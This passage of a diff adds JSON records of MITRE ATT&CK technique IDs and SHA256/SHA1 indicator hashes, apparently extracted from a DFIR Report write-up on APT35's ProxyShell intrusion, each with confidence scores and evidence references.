+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1059.003",
+      "type": "Technique",
+      "name": "T1059.003",
+      "normalized_name": "T1059.003",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1059.003",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1078",
+      "type": "Technique",
+      "name": "T1078",
+      "normalized_name": "T1078",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1078",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1082",
+      "type": "Technique",
+      "name": "T1082",
+      "normalized_name": "T1082",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1082",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1098",
+      "type": "Technique",
+      "name": "T1098",
+      "normalized_name": "T1098",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1098",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1105",
+      "type": "Technique",
+      "name": "T1105",
+      "normalized_name": "T1105",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1105",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1190",
+      "type": "Technique",
+      "name": "T1190",
+      "normalized_name": "T1190",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1190",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1505.003",
+      "type": "Technique",
+      "name": "T1505.003",
+      "normalized_name": "T1505.003",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1505.003",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1543.003",
+      "type": "Technique",
+      "name": "T1543.003",
+      "normalized_name": "T1543.003",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1543.003",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_ioc_sha256_12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a",
+      "type": "SHA256",
+      "name": "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a",
+      "normalized_name": "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_141"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_141",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e",
+      "type": "SHA256",
+      "name": "1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e",
+      "normalized_name": "1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_103"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_103",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e",
+      "type": "SHA256",
+      "name": "559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e",
+      "normalized_name": "559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_109"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_109",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0",
+      "type": "SHA256",
+      "name": "668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0",
+      "normalized_name": "668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_106"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_106",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b",
+      "type": "SHA256",
+      "name": "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b",
+      "normalized_name": "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113",
+        "ev_141"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_113",
+      "supporting_evidence_ids": [
+        "ev_141"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7",
+      "type": "SHA256",
+      "name": "84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7",
+      "normalized_name": "84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_96"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_96",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8",
+      "type": "SHA256",
+      "name": "c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8",
+      "normalized_name": "c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_99"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_99",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970",
+      "type": "SHA256",
+      "name": "faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970",
+      "normalized_name": "faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_144",
+        "ev_145"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_144",
+      "supporting_evidence_ids": [
+        "ev_145"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_04f72b9e78f196544f8f1331b4d9158df34d7ecf",
+      "type": "SHA1",
+      "name": "04f72b9e78f196544f8f1331b4d9158df34d7ecf",
+      "normalized_name": "04f72b9e78f196544f8f1331b4d9158df34d7ecf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_146",
+        "ev_147"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "04f72b9e78f196544f8f1331b4d9158df34d7ecf",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_146",
+      "supporting_evidence_ids": [
+        "ev_147"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_0f676bc786db3c44cac4d2d22070fb514b4cb64c",
+      "type": "SHA1",
+      "name": "0f676bc786db3c44cac4d2d22070fb514b4cb64c",
+      "normalized_name": "0f676bc786db3c44cac4d2d22070fb514b4cb64c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_108"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "0f676bc786db3c44cac4d2d22070fb514b4cb64c",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_108",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_1425ede905514b7dbf3c457561aaf2ff27274724",
+      "type": "SHA1",
+      "name": "1425ede905514b7dbf3c457561aaf2ff27274724",
+      "normalized_name": "1425ede905514b7dbf3c457561aaf2ff27274724",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_148",
+        "ev_149"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "1425ede905514b7dbf3c457561aaf2ff27274724",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_148",
+      "supporting_evidence_ids": [
+        "ev_149"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_1cfca93354d25e458db40f8d48403602b46bbf03",
+      "type": "SHA1",
+      "name": "1cfca93354d25e458db40f8d48403602b46bbf03",
+      "normalized_name": "1cfca93354d25e458db40f8d48403602b46bbf03",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_150",
+        "ev_151"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "1cfca93354d25e458db40f8d48403602b46bbf03",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_150",
+      "supporting_evidence_ids": [
+        "ev_151"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_1ff5e226ad8bed34916c16ccc77ba281ca3203ae",
+      "type": "SHA1",
+      "name": "1ff5e226ad8bed34916c16ccc77ba281ca3203ae",
+      "normalized_name": "1ff5e226ad8bed34916c16ccc77ba281ca3203ae",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_152",
+        "ev_153"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "1ff5e226ad8bed34916c16ccc77ba281ca3203ae",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_152",
+      "supporting_evidence_ids": [
+        "ev_153"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_27102b416ef5df186bd8b35190c2a4cc4e2fbf37",
+      "type": "SHA1",
+      "name": "27102b416ef5df186bd8b35190c2a4cc4e2fbf37",
+      "normalized_name": "27102b416ef5df186bd8b35190c2a4cc4e2fbf37",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_105"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "27102b416ef5df186bd8b35190c2a4cc4e2fbf37",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_105",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_3a6431169073d61748829c31a9da29123dd61da8",
+      "type": "SHA1",
+      "name": "3a6431169073d61748829c31a9da29123dd61da8",
+      "normalized_name": "3a6431169073d61748829c31a9da29123dd61da8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_116"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "3a6431169073d61748829c31a9da29123dd61da8",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_116",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_4d243969b54b9b80c1d26e0801a6e7e46d2ef03e",
+      "type": "SHA1",
+      "name": "4d243969b54b9b80c1d26e0801a6e7e46d2ef03e",
+      "normalized_name": "4d243969b54b9b80c1d26e0801a6e7e46d2ef03e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_98"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "4d243969b54b9b80c1d26e0801a6e7e46d2ef03e",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_98",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_503df469687fe4d14d2119a95723485d079ec0d9",
+      "type": "SHA1",
+      "name": "503df469687fe4d14d2119a95723485d079ec0d9",
+      "normalized_name": "503df469687fe4d14d2119a95723485d079ec0d9",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_154",
+        "ev_155"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "503df469687fe4d14d2119a95723485d079ec0d9",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_154",
+      "supporting_evidence_ids": [
+        "ev_155"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_57cdfd261266b81255e330723f4adf270fc4c4f8",
+      "type": "SHA1",
+      "name": "57cdfd261266b81255e330723f4adf270fc4c4f8",
+      "normalized_name": "57cdfd261266b81255e330723f4adf270fc4c4f8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_156",
+        "ev_157"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "57cdfd261266b81255e330723f4adf270fc4c4f8",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_156",
+      "supporting_evidence_ids": [
+        "ev_157"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_682e0458a336c3a6e93b18f7e972e1d67ef01598",
+      "type": "SHA1",
+      "name": "682e0458a336c3a6e93b18f7e972e1d67ef01598",
+      "normalized_name": "682e0458a336c3a6e93b18f7e972e1d67ef01598",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_158",
+        "ev_159"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "682e0458a336c3a6e93b18f7e972e1d67ef01598",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_158",
+      "supporting_evidence_ids": [
+        "ev_159"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_6bae2d45bbd8c4b0a59ba08892692fe86e596154",
+      "type": "SHA1",
+      "name": "6bae2d45bbd8c4b0a59ba08892692fe86e596154",
+      "normalized_name": "6bae2d45bbd8c4b0a59ba08892692fe86e596154",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "6bae2d45bbd8c4b0a59ba08892692fe86e596154",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_6f5271275e9ac22be9ded8b9252bce064e524153",
+      "type": "SHA1",
+      "name": "6f5271275e9ac22be9ded8b9252bce064e524153",
+      "normalized_name": "6f5271275e9ac22be9ded8b9252bce064e524153",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_160",
+        "ev_161"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "6f5271275e9ac22be9ded8b9252bce064e524153",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_160",
+      "supporting_evidence_ids": [
+        "ev_161"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_777d218adc789b7f1b146701793e78799324d87d",
+      "type": "SHA1",
+      "name": "777d218adc789b7f1b146701793e78799324d87d",
+      "normalized_name": "777d218adc789b7f1b146701793e78799324d87d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "777d218adc789b7f1b146701793e78799324d87d",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee",
+      "type": "SHA1",
+      "name": "8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee",
+      "normalized_name": "8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_102"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_102",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "type": "SHA1",
+      "name": "98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "normalized_name": "98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_162",
+        "ev_163"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_162",
+      "supporting_evidence_ids": [
+        "ev_163"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_ab814cbc408234eddf538bc893fcbe00c32ca2e9",
+      "type": "SHA1",
+      "name": "ab814cbc408234eddf538bc893fcbe00c32ca2e9",
+      "normalized_name": "ab814cbc408234eddf538bc893fcbe00c32ca2e9",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_164",
+        "ev_165",
+        "ev_166",
+        "ev_167"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "ab814cbc408234eddf538bc893fcbe00c32ca2e9",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_166",
+      "supporting_evidence_ids": [
+        "ev_165",
+        "ev_164",
+        "ev_167"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_b81839e3ce507df925d6e583e569e1ac3a3894ab",
+      "type": "SHA1",
+      "name": "b81839e3ce507df925d6e583e569e1ac3a3894ab",
+      "normalized_name": "b81839e3ce507df925d6e583e569e1ac3a3894ab",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_168",
+        "ev_169"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "b81839e3ce507df925d6e583e569e1ac3a3894ab",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_168",
+      "supporting_evidence_ids": [
+        "ev_169"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_da2470c3990ea0862a79149c6036388498da83cd",
+      "type": "SHA1",
+      "name": "da2470c3990ea0862a79149c6036388498da83cd",
+      "normalized_name": "da2470c3990ea0862a79149c6036388498da83cd",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_95"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "da2470c3990ea0862a79149c6036388498da83cd",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_95",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_ed4e771700681b36eb8dd74a13dffc94c857bb46",
+      "type": "SHA1",
+      "name": "ed4e771700681b36eb8dd74a13dffc94c857bb46",
+      "normalized_name": "ed4e771700681b36eb8dd74a13dffc94c857bb46",
+      "aliases": [],
+      "confidence": 0.99,
